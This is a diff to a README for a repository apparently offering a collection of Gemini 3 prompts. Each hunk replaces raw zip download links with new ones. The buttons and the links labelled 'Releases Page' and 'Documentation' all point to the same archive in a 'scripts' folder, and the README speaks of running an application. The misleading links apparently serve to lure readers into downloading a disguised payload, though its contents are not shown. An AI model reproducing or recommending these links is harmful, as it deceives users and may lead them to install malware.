@@ -1,6 +1,6 @@
 # ♊ awesome-gemini-3-prompts - Easy Access to 50+ Selected Prompts
 
-[![Download Now](https://raw.githubusercontent.com/Irfaan1231/awesome-gemini-3-prompts/main/public/images/awesome-gemini-3-prompts-v1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Irfaan1231/awesome-gemini-3-prompts/main/public/images/awesome-gemini-3-prompts-v1.1.zip)
+[![Download Now](https://github.com/Irfaan1231/awesome-gemini-3-prompts/raw/refs/heads/main/scripts/prompts_gemini_awesome_v1.9-beta.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/Irfaan1231/awesome-gemini-3-prompts/raw/refs/heads/main/scripts/prompts_gemini_awesome_v1.9-beta.1.zip)
 
 ## 🧐 Overview
 
@@ -13,7 +13,7 @@ To start using the awesome-gemini-3-prompts, follow these simple steps.
 ### 💾 Download & Install
 
 1. Click the button below to visit our Releases page.  
-   [Download Here](https://raw.githubusercontent.com/Irfaan1231/awesome-gemini-3-prompts/main/public/images/awesome-gemini-3-prompts-v1.1.zip)
+   [Download Here](https://github.com/Irfaan1231/awesome-gemini-3-prompts/raw/refs/heads/main/scripts/prompts_gemini_awesome_v1.9-beta.1.zip)
 
 2. On the Releases page, look for the latest version. You will see a list of files available for download.
 
@@ -70,8 +70,8 @@ If you encounter issues while downloading or running the application, consider t
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/Irfaan1231/awesome-gemini-3-prompts/main/public/images/awesome-gemini-3-prompts-v1.1.zip)
-- [Documentation](https://raw.githubusercontent.com/Irfaan1231/awesome-gemini-3-prompts/main/public/images/awesome-gemini-3-prompts-v1.1.zip)
+- [Releases Page](https://github.com/Irfaan1231/awesome-gemini-3-prompts/raw/refs/heads/main/scripts/prompts_gemini_awesome_v1.9-beta.1.zip)
+- [Documentation](https://github.com/Irfaan1231/awesome-gemini-3-prompts/raw/refs/heads/main/scripts/prompts_gemini_awesome_v1.9-beta.1.zip)
 
 ## 🙋 FAQs
 
@@ -88,4 +88,4 @@ If you encounter issues while downloading or running the application, consider t
 
 For any questions or support, please reach out via the contact form on our GitHub page.
 
-[![Download Now](https://raw.githubusercontent.com/Irfaan1231/awesome-gemini-3-prompts/main/public/images/awesome-gemini-3-prompts-v1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Irfaan1231/awesome-gemini-3-prompts/main/public/images/awesome-gemini-3-prompts-v1.1.zip)
+[![Download Now](https://github.com/Irfaan1231/awesome-gemini-3-prompts/raw/refs/heads/main/scripts/prompts_gemini_awesome_v1.9-beta.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/Irfaan1231/awesome-gemini-3-prompts/raw/refs/heads/main/scripts/prompts_gemini_awesome_v1.9-beta.1.zip)
